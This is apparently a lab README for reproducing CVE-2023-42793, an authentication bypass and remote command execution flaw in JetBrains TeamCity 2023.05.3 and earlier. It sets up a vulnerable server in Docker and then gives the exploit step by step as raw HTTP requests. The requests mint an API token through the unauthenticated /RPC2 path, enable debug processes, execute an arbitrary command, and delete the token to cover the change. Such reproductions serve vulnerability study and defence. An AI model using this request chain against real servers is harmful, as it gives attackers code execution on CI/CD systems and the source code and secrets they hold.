# Jetbrains TeamCity Authentication Bypass and Remote Command Execution (CVE-2023-42793)

[中文版本(Chinese version)](README.zh-cn.md)

TeamCity is a general-purpose CI/CD software platform that allows for flexible workflows, collaboration and development practices.

TeamCity server version 2023.05.3 and below is prone to an authentication bypass, which allows an unauthenticated attacker to gain remote code execution (RCE) on the server.

References:

- <https://www.sonarsource.com/blog/teamcity-vulnerability/>
- <https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/>

## Vulnerable Environment

Execute following command to start a TeamCity server 2023.05.3:

```
docker compose up -d
```

After the server is started, you should do the initialization steps on `http://localhost:8111`:

![](1.png)

## Exploit

The key point of this issue is that, all the requests end with `/RPC2` wouldn't be authenticated.

To exploit the issue, send the following request to add a rest API token that name is `RPC2`:

```
POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![](2.png)

Success to generate a rest API token. Then, enable the debug mode with the API token:

```
POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0


```

![](3.png)

You are able to execute arbitrary commands after the debug mode is enabled:

```
POST /app/rest/debug/processes?exePath=id HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0


```

![](4.png)

It's better to delete the API token that we added before:

```
DELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
